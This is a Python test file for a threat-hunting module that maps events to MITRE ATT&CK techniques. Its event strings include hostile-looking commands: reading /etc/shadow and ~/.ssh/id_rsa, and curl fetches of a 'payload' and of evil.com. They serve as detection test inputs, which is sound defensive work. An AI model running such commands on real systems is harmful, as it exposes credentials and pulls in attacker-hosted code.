"""Tests for clawdstrike.hunt.mitre — MITRE ATT&CK technique mapping."""

from __future__ import annotations

from datetime import datetime, timezone

from clawdstrike.hunt.mitre import (
    coverage_matrix,
    map_alert_to_mitre,
    map_event_to_mitre,
)
from clawdstrike.hunt.types import (
    Alert,
    EventSourceType,
    NormalizedVerdict,
    RuleSeverity,
    TimelineEvent,
    TimelineEventKind,
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_event(
    summary: str,
    process: str | None = None,
    action_type: str | None = None,
) -> TimelineEvent:
    return TimelineEvent(
        timestamp=datetime(2025, 6, 15, 12, 0, 0, tzinfo=timezone.utc),
        source=EventSourceType.TETRAGON,
        kind=TimelineEventKind.PROCESS_EXEC,
        verdict=NormalizedVerdict.NONE,
        summary=summary,
        process=process,
        action_type=action_type,
    )


def _make_alert(events: list[TimelineEvent]) -> Alert:
    return Alert(
        rule_name="test-rule",
        severity=RuleSeverity.HIGH,
        title="Test Alert",
        triggered_at=datetime(2025, 6, 15, 12, 0, 0, tzinfo=timezone.utc),
        evidence=tuple(events),
        description="Test alert description",
    )


# ---------------------------------------------------------------------------
# map_event_to_mitre
# ---------------------------------------------------------------------------


class TestMapEventToMitre:
    def test_etc_shadow(self) -> None:
        event = _make_event("cat /etc/shadow")
        result = map_event_to_mitre(event)
        ids = [t.id for t in result]
        assert "T1003.008" in ids

    def test_ssh_dir(self) -> None:
        event = _make_event("read ~/.ssh/id_rsa")
        result = map_event_to_mitre(event)
        ids = [t.id for t in result]
        assert "T1552.004" in ids

    def test_curl(self) -> None:
        event = _make_event("curl http://example.com/payload")
        result = map_event_to_mitre(event)
        ids = [t.id for t in result]
        assert "T1105" in ids

    def test_egress(self) -> None:
        event = _make_event("egress detected to external host")
        result = map_event_to_mitre(event)
        ids = [t.id for t in result]
        assert "T1041" in ids

    def test_bash(self) -> None:
        event = _make_event("spawned /bin/bash")
        result = map_event_to_mitre(event)
        ids = [t.id for t in result]
        assert "T1059.004" in ids

    def test_ssh_command(self) -> None:
        event = _make_event("ssh user@host")
        result = map_event_to_mitre(event)
        ids = [t.id for t in result]
        assert "T1021.004" in ids

    def test_no_match(self) -> None:
        event = _make_event("opened /tmp/data.txt for reading")
        result = map_event_to_mitre(event)
        assert len(result) == 0

    def test_multiple_matches(self) -> None:
        event = _make_event("ssh user@host", process="cat ~/.ssh/id_rsa")
        result = map_event_to_mitre(event)
        ids = [t.id for t in result]
        assert "T1552.004" in ids
        assert "T1021.004" in ids


# ---------------------------------------------------------------------------
# map_alert_to_mitre
# ---------------------------------------------------------------------------


class TestMapAlertToMitre:
    def test_deduplication_across_evidence(self) -> None:
        alert = _make_alert([
            _make_event("cat /etc/shadow"),
            _make_event("cat /etc/passwd"),
        ])
        result = map_alert_to_mitre(alert)
        t1003 = [t for t in result if t.id == "T1003.008"]
        assert len(t1003) == 1


# ---------------------------------------------------------------------------
# coverage_matrix
# ---------------------------------------------------------------------------


class TestCoverageMatrix:
    def test_groups_by_tactic(self) -> None:
        alerts = [
            _make_alert([
                _make_event("cat /etc/shadow"),
                _make_event("curl http://evil.com"),
            ]),
        ]
        matrix = coverage_matrix(alerts)
        assert "credential-access" in matrix
        assert "command-and-control" in matrix

    def test_empty_alerts(self) -> None:
        matrix = coverage_matrix([])
        assert len(matrix) == 0
